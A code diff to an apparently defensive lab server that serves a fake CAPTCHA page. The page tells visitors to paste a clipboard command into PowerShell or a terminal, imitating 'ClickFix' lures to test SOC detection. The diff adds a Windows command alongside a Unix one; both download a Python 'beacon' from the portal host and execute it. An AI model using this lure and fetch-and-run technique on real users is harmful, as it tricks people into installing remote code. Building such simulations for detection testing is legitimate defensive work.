@@ -198,9 +198,12 @@ CAPTCHA_HTML_TEMPLATE = """<!DOCTYPE html>
             <strong>Simulated Demo Steps (Lab Test Only):</strong>
             <ol style="margin:8px 0 0 18px; color:#cbd5e1;">
                 <li>The benign OmniGuard telemetry beacon command has been copied to your clipboard.</li>
-                <li>In your lab terminal, press <b>Ctrl+V</b> and <b>Enter</b> to trigger SpectraC2 detection.</li>
+                <li>Open <b>PowerShell</b> (Windows) or your terminal, press <b>Ctrl+V</b> and <b>Enter</b> to trigger SpectraC2 detection.</li>
             </ol>
-            <code id="cmd">__DEMO_CMD__</code>
+            <div style="margin-top:8px;color:#94a3b8;font-size:12px;">Windows (PowerShell) — copied to clipboard:</div>
+            <code id="cmd">__DEMO_CMD_PS__</code>
+            <div style="margin-top:8px;color:#94a3b8;font-size:12px;">Linux / macOS:</div>
+            <code id="cmd_nix">__DEMO_CMD__</code>
         </div>
         <div class="badge">OmniGuard SOC Closed-Network Lab Fixture &middot; Benign Simulation Only</div>
     </div>
@@ -219,6 +222,9 @@ CAPTCHA_HTML_TEMPLATE = """<!DOCTYPE html>
 """
 
 DEMO_CMD = "curl -s http://__PORTAL_HOST__/payload/beacon.py -o /tmp/rmm_watchdog_sim.py && python3 /tmp/rmm_watchdog_sim.py"
+# Windows ClickFix equivalent (victim pastes into PowerShell). raw string so the
+# backslashes in $env:TEMP\... stay literal.
+DEMO_CMD_PS = r"iwr http://__PORTAL_HOST__/payload/beacon.py -OutFile $env:TEMP\rmm_watchdog_sim.py; python $env:TEMP\rmm_watchdog_sim.py"
 
 ZERO_DEP_BEACON_PY = '''#!/usr/bin/env python3
 """Safe, zero-dependency OmniGuard Lab Beacon & RMM-Watchdog Simulator.
@@ -313,7 +319,10 @@ class PortalHandler(http.server.SimpleHTTPRequestHandler):
 
         if path in ("/captcha", "/verify-human"):
             cmd = DEMO_CMD.replace("__PORTAL_HOST__", portal_host)
-            body = CAPTCHA_HTML_TEMPLATE.replace("__DEMO_CMD__", cmd).encode("utf-8")
+            cmd_ps = DEMO_CMD_PS.replace("__PORTAL_HOST__", portal_host)
+            body = (CAPTCHA_HTML_TEMPLATE
+                    .replace("__DEMO_CMD_PS__", cmd_ps)
+                    .replace("__DEMO_CMD__", cmd)).encode("utf-8")
             self.send_response(200)
             self.send_header("Content-Type", "text/html; charset=utf-8")
             self.send_header("Content-Length", str(len(body)))
